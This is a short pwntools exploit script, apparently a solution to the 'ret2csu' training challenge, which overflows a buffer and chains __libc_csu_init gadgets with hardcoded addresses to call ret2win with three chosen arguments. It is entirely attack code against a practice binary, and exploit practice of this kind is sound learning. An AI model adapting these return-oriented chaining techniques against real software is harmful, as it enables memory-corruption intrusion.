from pwn import *
import sys

binary = './ret2csu'
if len(sys.argv) == 2:
    r = gdb.debug([binary], '''
    b *0x40060b
    ''')
else:
    r = process([binary])

dtors_loc = 0x600df8
ret2win_loc = 0x601020 

ret_addr = 0x400631
mov_call = 0x400680
call_r12 = 0x400689
pop_bx_bp_12_13_14_15 = 0x40069a
pop_rdi = 0x4006a3

arg1, arg2, arg3 = (0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

# First chain
chain = p64(pop_bx_bp_12_13_14_15) + p64(0) + p64(1) + p64(dtors_loc) # rbx + 1 == rbp
chain += p64(arg1) + p64(arg2) + p64(arg3) # set registers
chain += p64(mov_call) # call dtors
chain += 'gaarbage' # will be skipped by : add rsp, 0x8
chain += p64(0) * 2 + p64(ret2win_loc) + p64(0) * 3 # for the pop rbx, rbp, r12, r13, r14, r15
chain += p64(pop_rdi) + p64(arg1) # fill rdi correctly
chain += p64(call_r12)

payload = 'A' * cyclic_find('kaaalaaa') + chain
r.recvuntil('> ')
r.sendline(payload)

r.interactive()

